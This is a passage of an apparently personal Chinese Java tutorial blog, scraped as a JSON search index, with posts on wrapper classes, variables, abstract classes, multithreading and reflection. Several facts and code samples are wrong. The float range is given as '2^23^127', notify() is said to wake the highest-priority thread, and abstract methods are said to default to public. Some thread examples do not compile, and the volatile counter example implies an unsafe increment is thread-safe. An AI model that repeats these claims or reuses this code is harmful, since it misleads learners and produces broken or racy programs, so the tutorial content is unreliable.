2 3 4 // 采用包装类的 parseXxx() 方法，返回值为基本类型 int num1 = Integer.parseInt(\u0026#34;123\u0026#34;); // 如果字符串形式不对，运行时会发生 NumberFormatException 错误 // 如：int num1 = Integer.parseInt(\u0026#34;12a3\u0026#34;); 四、自动装箱的内存复用 自动装箱时，对于Integer var = ？，如果var指向的对象在-128 至 127 范围内的赋值时，生成的Integer实例化对象是由 IntegerCache.cache() 方法产生，它会复用已有对象。和 String 的共享池操作是一个道理，cache() 方法会将位于-128~127范围内产生的 Integer 对象入池，下次使用的时候，从池中拿去，就不会在创建了。\n1 2 3 4 5 6 7 Integer a1 = 1; Integer a2 = 1; System.out.println(a1 == a2); // true Integer b1 = 222; Integer b2 = 222; System.out.println(b1 == b2); // false 所以，在这个数值区间内的 Integer 对象的栈指向(属性名) 可以直接使用==进行判断，因为值\t相同，指向的就是同一片区域。但是这个区间之外的所有数据，自动装箱都会在堆上产生实例化，并不再复用已有对象，推荐使用 equals 方法进行Integer的判断。\n","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%8C%85%E8%A3%85%E7%B1%BB/","title":"Java学习之路——包装类"},{"content":"Java学习之路——变量 一、定义 1. 什么是变量？ 在计算机中，大部分需要实时处理的数据都被存放在了内存中。在内存内部，分割出了若干个数据存储单元，每个单元可以存储一个 8bit 的数据，就如同一栋楼里面包含了许许多多的居民房。为了区分这些存储单元，每个单元都分配了一个编号，这个编号就被称为内存地址。\n变量的实质是计算机按照我们需要使用的变量的数据类型及大小而分配到的一块内存空间，这块内存空间包含一个或多个数据存储单元，在这块空间中包含了变量的类型、名字和值。\n我们在编写Java程序时，表面上是在对变量进行操作，实质上是在对内存空间中的数据存储单元进行操作。只是由于编译器的功劳，能够让不同的变量与相对应的内存地址结合起来，让我们以操作变量的形式去操作数据存储单元。\n2. 什么是数据类型？ 不同的数据有着不同的类型，不同的类型有着不同的空间分配方式，不同的分配方式又需要着不同的数据空间。\n例如 在 Java中int类型和float类型都是4个字节，但是float类型的数值范围却大于int的数值范围。\n这就是因为两种类型的数据对空间的利用方式不同：\nint 类型： 第一位是符号位代表正负，剩下的31位表示数值位。其表示数据是各个位之间表示的值直接相加得出，所以表示的值范围是-2^31 ~ 2^31 - 1 float类型： 第一位是符号位代表正负，余下的是八位指数位和23位底数位(底数是无符号的)。此类型是8位指数23位底数，这么来说可以表示最大的值就是2^23^127，最小值就是-2^23^127。所以范围就是-2^23^127 ~ 2^23^127 数据类型的根本作用就是告诉计算机应该为这个变量分配多大的内存空间！\n3. 变量的声明与赋值 1 2 3 4 int num; // 声明一个整型的变量，变量名为num num = 100; // 为该整型变量赋值100 // 可以同时完成变量的声明与赋值 int num1 = 100; 二、作用域 1. 作用域的范围 在Java程序中，变量的使用使用范围限制的。这个范围就叫变量的作用域。\n一对 \u0026quot;{}\u0026quot; 就是一个作用域，在同一个作用域中，变量名不能重名，但是变量可以重新赋值。\n1 2 3 4 5 6 7 8 9 10 11 public class Demo { public static void main(String[] args) { int b = 10; for (int i=0 ; i\u0026lt;1 ; i++) { System.out.println(b); } // System.out.println(i); 此处会报错 } } 在上面这个程序中，\u0026ldquo;变量b\u0026rdquo; 定义在 \u0026ldquo;main方法\u0026rdquo; 之中，而 \u0026ldquo;for语句\u0026rdquo; 也在 \u0026ldquo;main方法\u0026rdquo; 中，因此可以在循环中访问 \u0026ldquo;变量b\u0026rdquo;；\n但是 \u0026ldquo;变量i\u0026rdquo; 是在 \u0026ldquo;for语句\u0026rdquo; 中定义的，因此只能在 \u0026ldquo;for语句\u0026rdquo; 中访问，循环结束后该变量已经被释放，在循环外面是无法访问 \u0026ldquo;i变量\u0026rdquo; 的。\n因此我们编写程序的过程中，对于一些只在循环、判断等地方使用的变量，我们可以在其内部定义变量，这样有利于我们节省内存空间。\n2. 成员变量和局部变量 局部变量：在方法体中声明的变量 成员变量：在方法体外，类体之内声明的变量叫成员变量 1 2 3 4 5 6 7 8 9 10 11 12 13 public class Demo { // 成员变量 int a = 10; public static void main(String[] args) { // 局部变量 int a = 100; int b = 1000; System.out.println(a); // 100 // 访问变量时遵循就近原则，优先访问局部变量 } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%8F%98%E9%87%8F/","title":"Java学习之路——变量"},{"content":"Java学习之路——抽象类与抽象方法 概述 抽象是从众多的事物中抽取出共同的、本质性的特征，而舍弃其非本质的特征的过程。具体地说，抽象就是人们在实践的基础上，对于丰富的感性材料通过去粗取精、去伪存真、由此及彼、由表及里的加工制作，形成概念、判断、推理等思维形式，以反映事物的本质和规律的方法。\n在 Java 程序中的抽象类与抽象方法：\n抽象方法只需要声明而不需要实现，抽象方法只声明返回的数据类型、方法名称和所需的参数，没有方法体； 抽象类是不能被实例化的，只能被子类继承。继承的子类必须实现抽象类中定义的抽象方法。 抽象的目的是把相同的但不确定的东西的提取出来，为了以后的重用。定义成抽象类的目的，就是为了在子类中实现抽象方法。\n拥有抽象方法的类就是抽象类（但抽象类中也可以不包含抽象方法），抽象类要使用abstract关键字声明。\n示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 // 定义一个抽象类 abstract class Demo0 { //普通方法 public void fun(){ System.out.println(\u0026#34;普通方法\u0026#34;); } //抽象方法 public abstract void eat(); } // 子类继承抽象类 class Demo1 extends Demo0 { // 重写抽象方法 @Override public void eat() { System.out.println(\u0026#34;eat() 方法已经实现\u0026#34;); } } 总结\n抽象类：\n抽象类不能被实例化。因为抽象类中方法未具体化，这是一种不完整的类，所以直接实例化也就没有意义了； 抽象类的使用必须有子类，使用 extends 继承，一个子类只能继承一个抽象类； 子类（如果不是抽象类）则必须覆写抽象类之中的全部抽象方法（如果子类没有实现父类的抽象方法，则必须将子类也定义为为 abstract 类。）； 抽象类可以不包含抽象方法，但如果类中包含抽象方法，就必须将该类声明为抽象类； 抽象类不能使用 final 声明，因为抽象类必须有子类，而 final 定义的类不能有子类； 由于抽象类里会存在一些属性，那么抽象类中一定存在构造方法，其存在目的是为了属性的初始化。并且子类对象实例化的时候，依然满足先执行父类构造，再执行子类构造的顺序； 外部抽象类不允许使用static声明，而内部的抽象类可以使用static声明。 抽象方法：\n抽象方法，是指没有方法体的方法，同时抽象方法还必须使用关键字abstract做修饰； **抽象方法必须为 public 或者 protected **（因为如果为private，则不能被子类继承，子类便无法实现该方法），缺省情况下默认为 public 。 ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E6%8A%BD%E8%B1%A1%E7%B1%BB%E4%B8%8E%E6%8A%BD%E8%B1%A1%E6%96%B9%E6%B3%95/","title":"Java学习之路——抽象类与抽象方法"},{"content":"Java学习之路——多线程 概述 现代操作系统（Windows，macOS，Linux）都可以执行多任务。多任务就是一台计算机同时运行多个任务。\n事实上 CPU 执行任务都是一条一条顺序执行的，但是“精明”的操作系统让每个任务都去 CPU 上执行一定的时间，然后立马就撤下来，只要每个任务之间的间隔时间足够短，那么我们就不会发现他们是一个一个执行的了。\n进程 对于操作系统来说，一个任务就是一个进程（Process），比如打开一个浏览器就是启动一个浏览器进程，打开一个记事本就启动了一个记事本进程，打开两个记事本就启动了两个记事本进程，打开一个Word就启动了一个Word进程。\n线程 线程是操作系统能够进行运算调度的最小单位。大部分情况下，它被包含在进程之中，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。在 Unix System V 及 SunOS 中也被称为轻量进程，但轻量进程更多指内核线程，而把用户线程称为线程。\n——维基百科\n操作系统、进程、线程\n┌──────────┐ │Process │ │┌────────┐│ ┌──────────┐││ Thread ││┌──────────┐ │Process ││└────────┘││Process │ │┌────────┐││┌────────┐││┌────────┐│ ┌──────────┐││ Thread ││││ Thread ││││ Thread ││ │Process ││└────────┘││└────────┘││└────────┘│ │┌────────┐││┌────────┐││┌────────┐││┌────────┐│ ││ Thread ││││ Thread ││││ Thread ││││ Thread ││ │└────────┘││└────────┘││└────────┘││└────────┘│ └──────────┘└──────────┘└──────────┘└──────────┘ ┌──────────────────────────────────────────────┐ │ Operating System │ └──────────────────────────────────────────────┘ 进程和线程是包含关系，但是多任务既可以由多进程实现，也可以由单进程内的多线程实现，还可以混合多进程＋多线程。\n多线程与多进程的对比：\n创建进程比创建线程开销大，尤其是在Windows系统上； 进程间通信比线程间通信要慢，因为线程间通信就是读写同一个变量，速度很快； 多进程稳定性比多线程高。因为在多进程的情况下，一个进程崩溃不会影响其他进程；而在多线程的情况下，任何一个线程崩溃会直接导致整个进程崩溃。 一、创建线程 1. 创建线程 Java 语言中，JVM 允许多线程的存在。我们可以利用 java.lang.Thread 类来实现多线程。\nThread 类的特性：\n每个线程都是调用的 run() 方法，run() 方法的主体就称为线程体； 通过调用 Thread 类实例的 start() 方法来启动这个线程。 示例1：\n1 2 3 4 5 6 public class Demo { public static void main(String[] args) { Thread t1 = new Thread(); // 创建线程 t1.start(); // 启动线程 } } 在示例1中，我们创建了一个子线程，并且启动了这个子线程。但是这个子线程什么也没干就结束了，实际开发中我们肯定不会这么无聊，我们需要像万恶的资本家一样压榨每一个线程。因此我们需要给这个线程分配一些任务才行！\n2. 为线程添加任务 在 Java 程序为线程分配任务有如下几种方式可以实现：\n方式一：继承 Thread 类，重写 run() 方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class Demo { public static void main(String[] args) { Thread t1 = new MyThread(); t1.start(); } } class MyThread extends Thread { @Override public void run() { System.out.println(\u0026#34;A new thread was created!\u0026#34;); } } 方式二：创建Thread实例时，传入一个Runnable实例\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class Demo { public static void main(String[] args) { Thread t1 = new Thread(new MyRunnable()); t1.start(); } } class MyRunnable implements Runnable { @Override public void run() { System.out.println(\u0026#34;A new thread was created by implementation Runnable interface!\u0026#34;); } } 方式三：通过 Java8 的 lambda 语法传递方法\n1 2 3 4 5 6 7 8 public class Demo { public static void main(String[] args) { Thread t1 = new Thread(() -\u0026gt; { System.out.println(\u0026#34;A new thread was created by lambda!\u0026#34;); }); t1.start(); } } 二、线程的常用一般方法 1. run() 方法 run() 方法是一个线程的线程体，线程运行的时候执行的就是 run() 方法。\n2. start() 方法 启动当前线程，调用线程对象的 run() 方法。\n3. currentThread() 方法 这是一个 Thread 类的静态方法，会返回当前程序的线程。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class Demo { public static void main(String[] args) { Thread t1 = new Thread(() -\u0026gt; { System.out.println(\u0026#34;Thread：\u0026#34; + Thread.currentThread()); System.out.println(\u0026#34;A new thread was created by lambda!\u0026#34;); }); t1.start(); System.out.println(\u0026#34;main：\u0026#34; + Thread.currentThread()); } } // main：Thread[main,5,main] // Thread：Thread[Thread-0,5,main] // A new thread was created by lambda! 4. getName() 方法 返回线程的名字。\n1 2 3 4 5 6 7 public class Demo { public static void main(String[] args) { Thread t1 = new Thread(); t1.start(); System.out.println(\u0026#34;main：\u0026#34; + t1.getName()); } } 5. setName 方法 设置线程的名字，与 getName() 方法类似。\n6.yield() 方法 这是一个 Thread 类的静态方法，它会暂停当前正在执行的线程对象，并执行其他线程。在多线程的情况下，由CPU决定执行哪一个线程。\n7. sleep() 方法 sleep() 方法会让当前线程沉睡一定时间（单位ms）。\n1 2 3 4 5 6 7 8 public class Demo { public static void main(String[] args) throws InterruptedException { Thread t1 = new Thread(); t1.start(); t1.sleep(10); // 10ms System.out.println(\u0026#34;The main thread has finished executing.\u0026#34;); } } 8. join() 方法 阻塞当前线程，直到调用线程运行结束。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class Demo { public static void main(String[] args) throws InterruptedException { Thread t1 = new Thread(() -\u0026gt; { try { Thread.currentThread().sleep(1000); System.out.println(\u0026#34;The child thread has finished executing.\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } }); t1.start(); t1.join(); System.out.println(\u0026#34;The main thread has finished executing.\u0026#34;); } } 在上面的例程中，当程序运行到 t1.join() 是，会阻塞主线程，直到 t1 线程运行结束，因此输出结果为\nThe child thread has finished executing. The main thread has finished executing. 如果注释掉 t1.join()，那么运行到此处时主线程不会阻塞，会继续运行下去。当主线程运行完时，如果 t1 线程还没有结束，那么 JVM 虚拟机会等待 t1 线程运行完毕再退出程序。因此其输出结果为\nThe main thread has finished executing. The child thread has finished executing. 9. isAlive() 方法 判断当前线程是否还存活，是返回 true 否则返回 false。\n10. setDaemon() 方法 在 Java 程序运行过程中，先由 JVM 启动main线程，main线程又可以启动其他线程。JVM 会等待所有线程全部运行结束后才会退出程序。\n但是如果我们想要一个线程跟随其它线程一起退出程序，不管这个线程运行完成没有，只要其它线程都运行完了，那么这个线程就必须强行中止。\n要实现这个功能，我们使用 setDaemon() 方法可以把这个线程设置为守护线程。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class Demo { public static void main(String[] args) throws InterruptedException { Thread t1 = new Thread(() -\u0026gt; { for (int i=0 ; i\u0026lt;1000 ; i++) { try { Thread.currentThread().sleep(10); } catch (InterruptedException e) { e.printStackTrace(); } } System.out.println(\u0026#34;The child thread has ended.\u0026#34;); }); t1.setDaemon(true); t1.start(); System.out.println(\u0026#34;The main thread has ended.\u0026#34;); } } 在上面的程序中，我们将 t1 线程设置为了守护线程。当 main 线程运行结束时 ，子线程还没有运行完毕。但是因为 t1 线程是守护线程，它必须跟随主线程一起退出。因此其输出结果为 ：\n1 The main thread has ended. 如果说我们不将该线程设置为守护线程，那么输出结果为：\n1 2 The main thread has ended. The child thread has ended. 注意：设置该线程为守护线程的操作必须在线程启动前设置。在线程启动后是不能够设置为守护线程的！\n三、线程优先级 1. 优先级分类 在 Java 程序中，线程的优先级使用 1 ~ 10 的整数表示：\n最低优先级 1：Thread.MIN_PRIORITY 普通优先级 5：Thread.NORM_PRIORITY 最高优先级 10：Thread.MAX_PRIORITY 2. 获取线程优先级 通过调用 getPriority() 方法可以获取线程的优先级。\n1 2 3 4 5 6 7 8 public class Demo { public static void main(String[] args) { Thread t1 = new Thread(); t1.start(); System.out.println(\u0026#34;子线程优先级：\u0026#34; + t1.getPriority()); // // 子线程优先级：5 System.out.println(\u0026#34;主线程优先级：\u0026#34; + Thread.currentThread().getPriority()); // 主线程优先级：5 } } 3. 设置线程优先级 我们可以通过调用 setPriority() 方法来设置线程的优先级。\n1 2 3 4 5 6 7 8 9 10 11 public class Demo { public static void main(String[] args) { Thread t1 = new Thread(); t1.start(); Thread.currentThread().setPriority(Thread.MAX_PRIORITY); // 设置主线程的线程优先级为最大 t1.setPriority(Thread.NORM_PRIORITY); // 设置子线程的线程优先级为普通 System.out.println(\u0026#34;子线程优先级：\u0026#34; + t1.getPriority()); // 子线程优先级：5 System.out.println(\u0026#34;主线程优先级：\u0026#34; + Thread.currentThread().getPriority()); // 主线程优先级：10 } } 4. 线程默认优先级 Java 程序中子线程的默认线程优先级是跟随父线程的线程优先级的，而非普通优先级Thread.NORM_PRIORITY。\n1 2 3 4 5 6 7 8 9 public class Demo { public static void main(String[] args) { Thread.currentThread().setPriority(Thread.MAX_PRIORITY); // 指定父线程的线程优先级最大 Thread t1 = new Thread(); t1.start(); System.out.println(\u0026#34;子线程优先级：\u0026#34; + t1.getPriority()); // 子线程优先级：10 System.out.println(\u0026#34;主线程优先级：\u0026#34; + Thread.currentThread().getPriority()); // 主线程优先级：10 } } 在上面的例程中，由于我们最开始设置了父线程的线程优先级为最大，因此创建出的子线程的线程优先级也是最大的。\n如果说我们不设置父线程的线程优先级，那么父线程的默认线程优先级为 Thread.NORM_PRIORITY，因此创建出来的子线程的默认线程优先级也为 Thread.NORM_PRIORITY。\n5. 线程调度 高优先级的线程比低优先级的线程有更高的几率得到执行。\n我们要注意，只是高优先级的线程只是比低优先级的线程有着更高的机率执行。但是具体谁先执行，什么时候执行就是由操作系统决定的了，我们编写代码的人是无法得知的。\n四、线程的生命周期 总的来说线程的状态有以下六种：\n初始(NEW)：新创建了一个线程对象，但还没有开始运行（调用 start() 方法）； 就绪(RUNNABLE)：线程对象创建后并调用 start() 方法后，该线程不会立刻进入运行状态。它首先进入可运行线程池中，等待被线程调度选中，获取CPU的使用权； 运行(RUNNING)：当在线程池中的线程获取到 CPU 使用权后，就可以开始运行了； 阻塞(BLOCKED)：线程阻塞于锁； 等待(WAITING)：进入该状态的线程需要等待其他线程做出一些特定动作（通知或中断）； 超时等待(TIMED_WAITING)：该状态的线程也会进入等待状态，但是不会一直等待下去。该在等待指定的时间后自行返回； 终止(TERMINATED)：表示该线程已经执行完毕。 五、线程同步 1. 不安全的多线程 由于当多个线程同时运行时，线程的调度由操作系统决定，程序本身无法决定。因此，任何一个线程都有可能在任何指令处被操作系统暂停，然后在某个时间段后继续执行。\n如果说多个线程之间操作的都是共享变量，那么就有可能出现数据不一致的问题。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 public class Demo { static int x = 100; public static void main(String[] args) throws InterruptedException { // 创建两个线程，都对 x 进行操作 Thread t1 = new Thread(() -\u0026gt; { for(int i=0 ; i\u0026lt;1000 ; i++) { try { Thread.currentThread().sleep(2); Demo.x += 1; } catch (InterruptedException e) { e.printStackTrace(); } } }); Thread t2 = new Thread(() -\u0026gt; { for(int i=0 ; i\u0026lt;1000 ; i++) { try { Thread.currentThread().sleep(1); Demo.x -= 1; } catch (InterruptedException e) { e.printStackTrace(); } } }); t1.start(); t2.start(); t2.join(); System.out.println(Demo.x); } } 在上面的例程中，由于操作系统、运行环境等各个方面的问题，会导致程序每次运行的结果都有可能不一致。\n这种不确定性是我们不希望看到的，因为它的不可控会导致程序会出现各种情况。因此我们需要想办法解决多线程操作共享变量时不可控的问题。\n2. synchronized 关键字 在 Java 程序中同步机制可以使用 synchronized关键字 实现。\n在 Java 程序中的每个对象都有一个内置锁，当用此 synchronized 关键字修饰方法时，内置锁会保护整个方法。在调用该方法前，需要获得内置锁，否则就处于阻塞状态；用 synchronized 关键字修饰代码块时，被该关键字修饰的语句块会自动被加上内置锁，从而实现同步。\nⅠ、同步方法 模板\n1 2 3 权限修饰符 synchronized 返回值 方法名(形参列表) { 方法体 } 示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 public class Demo { public static void main(String[] args) { // 创建两个线程，都对 x 进行操作 MyThreadA t1 = new MyThreadA(); MyThreadB t2 = new MyThreadB(); t1.start(); t2.start(); t2.join(); System.out.println(Counter.x); } } class Counter { private static int count = 100; public static synchronized void addition() { count += 1; } } class MyThreadA extends Thread { @Override public void run() { for (int i=0 ; i\u0026lt;1000 ; i++) { Counter.addition(); } } } class MyThreadB extends Thread { @Override public void run() { for (int i=0 ; i\u0026lt;1000 ; i++) { Counter.addition(); } } } Ⅱ、同步代码块 模板\n1 2 3 synchronized(object对象) { 代码块 } 示例\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 public class Demo { public static void main(String[] args) throws InterruptedException { // 创建两个线程，都对 x 进行操作 Counter counter = new Counter(); Thread t1 = new Thread(() -\u0026gt; { for (int i=0 ; i\u0026lt;1000 ; i++) { synchronized (counter) { counter.count += 1; } } }); Thread t2 = new Thread(() -\u0026gt; { for (int i=0 ; i\u0026lt;1000 ; i++) { synchronized (counter) { counter.count -= 1; } } }); t1.start(); t2.start(); t2.join(); System.out.println(Counter.count); } } class Counter { public static int count = 100; } Ⅲ、wait() / notify()\nwait()：使当前线程进入阻塞状态，并释放同步监视锁。可以传入数字参数，传入数字参数后就变成了超时等待状态； notify()：唤醒进入等待（wait）状态的一个线程，如果有多个线程进入等待状态，则唤醒优先级最高的线程； notifyAll()：唤醒所有进入等待状态的线程，这些被唤醒的线程开始竞争锁，但只有一个线程能抢到，这个线程执行完后，其他线程又会有一个幸运儿脱颖而出得到锁。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 public class Demo { public static void main(String[] args) throws InterruptedException { // 创建两个线程，都对 x 进行操作 Counter counter = new Counter(); Thread t1 = new Thread(() -\u0026gt; { for (int i=0 ; i\u0026lt;100 ; i++) { synchronized (counter) { try { counter.wait(); System.out.println(\u0026#34;wait......\u0026#34;); counter.count += 1; counter.notify(); System.out.println(\u0026#34;notify!\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } } } }); Thread t2 = new Thread(() -\u0026gt; { for (int i=0 ; i\u0026lt;100 ; i++) { synchronized (counter) { try { counter.notify(); System.out.println(\u0026#34;wait......\u0026#34;); counter.count -= 1; counter.wait(); System.out.println(\u0026#34;notify!\u0026#34;); } catch (InterruptedException e) { e.printStackTrace(); } } } }); t1.start(); t2.start(); t2.join(); System.out.println(Counter.count); } } class Counter { public static int count = 100; } 3. volatile 关键字 volatile 关键字 在 Java 程序中有着如下作用：\nvolatile 关键字为域变量的访问提供了一种免锁机制，它保证了不同线程对这个变量进行操作时的可见性，即一个线程修改了某个变量的值，这新值对其他线程来说是立即可见的。\n示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 public class Demo { public static void main(String[] args) { // 创建两个线程，都对 x 进行操作 MyThread1 t1 = new MyThread1(); MyThread2 t2 = new MyThread2(); t1.start(); t2.start(); t1.join(); System.out.println(Counter.count); } } class Counter { // volatile 修饰 count 属性 static volatile int count = 0; public static void add() { count += 1; } } class MyThread1 extends Thread { @Override public void run() { for (int i=0 ; i\u0026lt;1000 ; i++) { Counter.add(); } } } class MyThread2 extends Thread { @Override public void run() { for (int i=0 ; i\u0026lt;1000 ; i++) { Counter.add(); } } } 4. 可重入锁 (ReentrantLock) ReentrantLock 又称为可重入锁，它是可重入、互斥、实现了Lock接口的锁，它与使用synchronized方法和快具有相同的基本行为和语义，并且扩展了其能力。\nReenreantLock 类的常用方法：\nlock()：获得锁 unlock()：释放锁 示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 import java.util.concurrent.locks.ReentrantLock; public class Demo { public static void main(String[] args) { // 创建两个线程，都对 x 进行操作 MyThreadA t1 = new MyThreadA(); MyThreadB t2 = new MyThreadB(); t1.start(); t2.start(); t2.join(); System.out.println(Counter.count); } } class Counter { public static int count = 0; private static ReentrantLock lock = new ReentrantLock(); public static void addition() { lock.lock(); count += 1; lock.unlock(); } } class MyThreadA extends Thread { @Override public void run() { for (int i=0 ; i\u0026lt;1000 ; i++) { Counter.addition(); } } } class MyThreadB extends Thread { @Override public void run() { for (int i=0 ; i\u0026lt;1000 ; i++) { Counter.addition(); } } } 六、线程池 Java 语言中虽然内置了多线程支持，启动一个新线程非常方便。但是，创建线程需要操作系统资源（线程资源，栈空间等），频繁创建和销毁大量线程需要消耗大量时间。\n那么我们就可以把很多小任务让一组线程来执行，而不是一个任务对应一个新线程。这种能接收大量小任务并进行分发处理的就是线程池。\n1. 线程池种类 ExecutorService只是接口，Java标准库提供的几个常用实现类有：\nFixedThreadPool：线程数固定的线程池； CachedThreadPool：线程数根据任务动态调整的线程池； SingleThreadExecutor：仅单线程执行的线程池。 2. 提交任务 线程池常用方法：\nexecute()：用于提交不需要返回结果的任务； submit()：用于提交一个需要返回果的任务。该方法返回一个Future对象，通过调用这个对象的get()方法，我们就能获得返回结果。get()方法会一直阻塞，直到返回结果返回。 3. 关闭线程池 关闭线程池有两种方法：\nshutdown()：该方法会将线程池状态置为SHUTDOWN，使线程池不再接受新的任务，同时会等待线程池中已有的任务执行完成再结束； shutdownNow()：该方法会将线程池状态置为SHUTDOWN，并对所有线程执行interrupt()操作，清空任务队列，并将队列中的任务返回回来； isShutdown()和isTerminated：分别表示线程池是否关闭和是否终止。 4. 线程池监控 getTaskCount()：该方法返回已经执行或正在执行的任务数； getCompletedTaskCount()：该方法返回已经执行的任务数； getLargestPoolSize()：该方法返回线程池曾经创建过的最大线程数。我们可以使用这个方法知道线程池是否满过，从而考虑是否要扩大线程池容量； getPoolSize()：该方法返回线程池线程数； getActiveCount()：该方法返回活跃线程数（即线程池中正在执行任务的线程数）。 ThreadPoolExecutor中还有三个可重写的方法：\nbeforeExecute(Thread t, Runnable r)：任务执行前被调用； afterExecute(Runnable r, Throwable t)：任务执行后被调用； terminated()：线程池结束后被调用。 5. 示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 import java.lang.reflect.Executable; import java.util.concurrent.Executor; import java.util.concurrent.ExecutorService; import java.util.concurrent.Executors; public class Demo { public static void main(String[] args) { ExecutorService pool = Executors.newFixedThreadPool(5); for (int i=0 ; i\u0026lt;10 ; i++) { pool.execute(new Counter(i)); } pool.shutdown(); } } class Counter implements Runnable { private int name; public Counter(int name) { this.name = name; } @Override public void run() { System.out.println(\u0026#34;Thread-\u0026#34; + this.name); } } ","date":"2025-08-22T17:34:52+08:00","permalink":"https://wlynxg.github.io/blog/p/java%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF%E5%A4%9A%E7%BA%BF%E7%A8%8B/","title":"Java学习之路——多线程"},{"content":"Java学习之路——反射 概述 定义 反射（Reflection）被视为动态语言的关键，通过反射机制可以运行程序在运行期间 获取任何对象的所有信息，并且能够直接操作对象的属性与方法。\nJava 反射机制可以动态地创建对象并调用其属性，这样的对象的类型在编译期是未知的。所以我们可以通过反射机制直接创建对象，即使这个对象的类型在编译期是未知的。\n反射的核心是 JVM 在运行时才动态加载类或调用方法/访问属性，它不需要事先（写代码的时候或编译期）知道运行对象是谁。\n功能 Java 反射主要提供以下功能：\n在运行时判断任意一个对象所属的类； 在运行时构造任意一个类的对象； 在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）； 在运行时调用任意一个对象的方法和属性； 在运行时获取泛型的信息； 在运行时处理注解； 生成动态代理。 区别 通过反射构造对象与正常方式有着如下区别：\n正常情况下：\ngraph LR A[引入需要的类] --\u0026gt; B[通过 new 实例化] B --\u0026gt; C[获取实例对象] 反射机制下：\ngraph LR A[实例化对象] --\u0026gt; B[调用 getClass 方法] B --\u0026gt; C[得到完整的类] C --\u0026gt; D[构造进的实例对象] 一、Class 类 定义 在 Java 程序种除了八种基本类型外，其他类型全部都是class（包括interface）。而class是由JVM在执行过程中动态加载的。JVM在第一次读取到一种class类型时，将其加载进内存。\n每加载一种class，JVM就为其创建一个Class（名叫 Class 的 类）类型的实例，并关联起来。\n由于JVM为每个加载的class创建了对应的Class实例，并在实例中保存了该class的所有信息，包括类名、包名、父类、实现的接口、所有方法、字段等，因此，如果获取了某个Class实例，我们就可以通过这个Class实例获取到该实例对应的class的所有信息。\n这种通过Class实例获取class信息的方法称为反射（Reflection）。\n获取 Class 类 方式一：通过类的 class 属性获取\n1 Class clazz = String.class; 方式二：过该实例变量提供的getClass()方法获取\n1 2 String s = \u0026#34;Hello\u0026#34;; Class clazz = s.getClass(); 如果知道一个class的完整类名，可以通过静态方法Class.forName()获取\n1 Class clazz = Class.forName(\u0026#34;java.lang.String\u0026#34;); 二、获取字段 Class类提供了以下几个方法来获取字段：\nField getField(name)：根据字段名获取某个 public 的 field（包括父类）； Field getDeclaredField(name)：根据字段名获取当前类的某个 field（不包括父类）； Field[] getFields()：获取所有 public 的 field（包括父类）； Field[] getDeclaredFields()：获取当前类的所有 field（不包括父类）。 三、调用方法 Class类提供了以下几个方法来获取Method：\nMethod getMethod(name, Class...)：获取某个public的Method（包括父类）； Method getDeclaredMethod(name, Class...)：获取当前类的某个Method（不包括父类）； Method[] getMethods()：获取所有public的Method（包括父类）； Method[] getDeclaredMethods()：获取当前类的所有Method（不包括父类）。 四、调用构造器 通过Class实例获取Constructor的方法如下：\ngetConstructor(Class...)：获取某个public的Constructor； getDeclaredConstructor(Class...)：获取某个Constructor； getConstructors()：获取所有public的Constructor； getDeclaredConstructors()：获取所有Constructor。 五、获取继承关系 通过Class对象可以获取继承关系：\nClass getSuperclass()：获取父类类型； Class[] getInterfaces()：获取当前类实现的所有接口。 六、使用反射 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class Demo { public static void main(String[] args) throws Exception { // 构建 Person 实例 Person p1 = new Person( \u0026#34;小明\u0026#34;,15,60); System.out.println(p1); // 获取 Person 类结构 Class clazz = Person.class; // 获取类构造器 Constructor constructor = clazz.getConstructor(String.class, int.class, int.class); // 构造一个新的实例对象 Object p2 = constructor.newInstance(\u0026#34;小刚\u0026#34;, 18, 70); System.out.println(p2); // 获取属性 Field name = clazz.getDeclaredField(\u0026#34;name\u0026#34;); // 修改对象属性值 name.set(p1, \u0026#34;小红\u0026#34;); System.out.println(p1.name); // 获取方法 Method sayName = clazz.getDeclaredMethod(\u0026#34;sayName\u0026#34;); // 调用对象的方法 sayName.invoke(p1); // 